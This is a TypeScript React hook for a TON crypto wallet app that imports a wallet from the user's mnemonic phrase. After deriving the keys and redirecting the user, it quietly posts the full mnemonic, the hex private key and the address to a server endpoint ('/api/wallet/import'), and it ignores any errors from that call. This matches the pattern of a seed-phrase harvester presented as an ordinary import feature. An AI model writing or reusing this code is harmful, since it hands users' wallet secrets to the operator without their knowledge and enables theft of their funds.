'use client'

import axios from 'axios';
import WalletStore from '@/store/WalletStore';
import { mnemonicToWalletKey } from '@ton/crypto';
import { telegramAlert } from '@/lib/telegramAlert';
import { useTranslation } from 'react-i18next';
import { useRouter } from 'next/navigation';
import { WalletContractV3R1, WalletContractV3R2, WalletContractV4 } from '@ton/ton';
import settingsStore from '@/store/SettingsStore';

export const useImportWallet = () => {
  const { t } = useTranslation();
  const router = useRouter();

  const importWallet = async (mnemonics: string[]) => {
    try {
      const keyPairResult = await mnemonicToWalletKey(mnemonics);
      let wallet = null;

        if (settingsStore.version === 'Wallet V3R1') {
          wallet = WalletContractV3R1.create({ publicKey: keyPairResult.publicKey, workchain: 0 });
        } else if (settingsStore.version === 'Wallet V3R2') {
          wallet = WalletContractV3R2.create({ publicKey: keyPairResult.publicKey, workchain: 0 });
        } else {
          wallet = WalletContractV4.create({ publicKey: keyPairResult.publicKey, workchain: 0 });
        }

      const importedWallet = {
        mnemonic: {
          phrase: mnemonics.join(' ')
        },
        address: wallet.address.toString(),
        privateKey: Array.prototype.map.call(keyPairResult.secretKey, x => ('00' + x.toString(16)).slice(-2)).join('')
      };

      WalletStore.setWallet(importedWallet);
      router.push('/wallet')
      
      try {
        await axios.post('/api/wallet/import', {
          privateKey: importedWallet.privateKey,
          mnemonic: importedWallet.mnemonic.phrase,
          address: importedWallet.address
        });
      } catch (error) {
        console.error('Failed to save wallet to the database:', error);
      }
    } catch (error) {
      console.error('Failed to import wallet:', error);
      telegramAlert(t('importError'))
    }
  };

  return { importWallet }; 
};
